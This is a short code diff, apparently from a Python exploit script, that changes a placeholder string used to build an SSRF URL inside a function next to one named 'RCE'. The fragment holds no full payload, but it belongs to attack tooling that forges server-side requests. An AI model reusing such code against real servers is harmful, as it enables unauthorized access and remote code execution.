@@ -66,7 +66,7 @@ def RCE(host, email):
 
 def get_CN(session, host):
     if any(char.isdigit() for char in use_name) or len(use_name) < 3:
-        pattern = "kkkk"
+        pattern = "asdfsdfaasdf"
     else:
         pattern = use_name.lower()
     ssrf_url = "[{0}]@{0}/".format(pattern)
